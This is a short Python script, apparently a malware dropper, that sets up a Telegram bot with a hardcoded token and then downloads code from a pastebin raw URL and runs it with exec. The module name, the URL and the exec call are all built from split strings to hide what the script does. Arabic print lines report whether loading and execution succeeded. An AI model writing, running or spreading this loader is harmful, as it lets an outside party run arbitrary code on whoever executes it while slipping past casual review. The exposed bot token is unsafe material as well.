import sys
import telebot

tt = "requ"
Gg = "ests"
Ggg = tt + Gg  
module = __import__(Ggg) 
token= "6798915278:AAGaPIUIiilZy7pIY9sw94h3AYrmYgz3Eug"
bot = telebot.TeleBot(token)
hh=('htt') 
hh2=('ps')
hh3=('://pastebin.com/raw/FrKnRJSa')
hh4= hh+hh2+hh3
url = hh4


response = module.get(url)

if response.status_code == 200:

    code = response.text


    importlib = __import__("importlib")
    importlib_util = importlib.util

    
    module_name = "external_code"
    spec = importlib_util.spec_from_loader(module_name, loader=None)
    new_module = importlib_util.module_from_spec(spec)

    ec = "ex"
    ex = "ec"
    eec_func = getattr(__builtins__, ec + ex)

    eec_func(code, new_module.__dict__)

    sys.modules[module_name] = new_module



    print("تم تحميل وتنفيذ الكود بنجاح.")
else:
    print("حدث خطأ في تحميل الكود.")